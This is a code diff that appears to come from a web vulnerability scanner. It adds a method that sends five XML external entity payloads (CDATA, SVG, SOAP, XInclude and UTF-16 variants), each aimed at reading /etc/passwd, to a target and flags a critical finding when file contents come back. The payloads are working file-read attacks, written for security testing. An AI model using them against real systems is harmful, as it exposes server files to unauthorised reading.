@@ -47,6 +47,9 @@ class XXEModule:
         
         # Test with different techniques
         self._test_variants(url, method, param, value)
+        
+        # Test CDATA and encoding variations
+        self._test_cdata_and_encoding(url, method, param, value)
     
     def test_url(self, url: str):
         """Test URL for XXE"""
@@ -166,6 +169,41 @@ class XXEModule:
             except Exception as e:
                 if self.engine.config.get('verbose'):
                     print(f"{Colors.error(f'XXE variant test error: {e}')}")
+    
+    def _test_cdata_and_encoding(self, url: str, method: str, param: str, value: str):
+        """Test XXE with CDATA sections and encoding variations"""
+        payloads = [
+            # CDATA exfiltration
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % dtd "<!ENTITY all \'%start;%file;%end;\'>">%dtd;]><data>&all;</data>',
+            # SVG-based XXE
+            '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
+            # SOAP-based XXE
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
+            # XInclude
+            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
+            # UTF-16 encoded
+            '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        ]
+        for payload in payloads:
+            try:
+                headers = {'Content-Type': 'application/xml'}
+                response = self.requester.request(url, 'POST', data=payload.encode('utf-8'), headers=headers)
+                if not response:
+                    continue
+                text = response.text.lower()
+                strong_count = sum(1 for ind in self.xxe_strong_indicators if ind.lower() in text)
+                if strong_count >= 2:
+                    from core.engine import Finding
+                    finding = Finding(
+                        technique="XXE (Advanced Technique)",
+                        url=url, severity='CRITICAL', confidence=0.9, param=param,
+                        payload=payload[:100],
+                        evidence="XXE via advanced technique - file content retrieved",
+                    )
+                    self.engine.add_finding(finding)
+                    return
+            except Exception:
+                continue
     
     def exploit_read_file(self, url: str, file_path: str) -> str:
         """Attempt to read file via XXE"""
